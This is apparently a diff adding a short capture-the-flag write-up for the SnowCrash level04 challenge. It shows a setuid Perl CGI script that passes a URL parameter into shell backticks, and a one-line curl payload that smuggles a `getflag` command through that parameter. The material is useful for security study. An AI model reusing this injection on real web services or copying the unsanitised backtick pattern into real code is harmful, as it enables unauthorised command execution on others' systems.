@@ -1,0 +1,24 @@
+total 4
+-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+
+script executes with the rights of the creator (flag04)
+
+level04@SnowCrash:~$ cat level04.pl 
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+it runs on a localhost port 4747
+
+it waits for param 'x' and write the param 'x' to stdout
+lets pass getflag function to be executed in the script with the rights of the flag04
+
+use \ to pass '`' as a symbol 
+
+curl localhost:4747?x=\`getflag\`
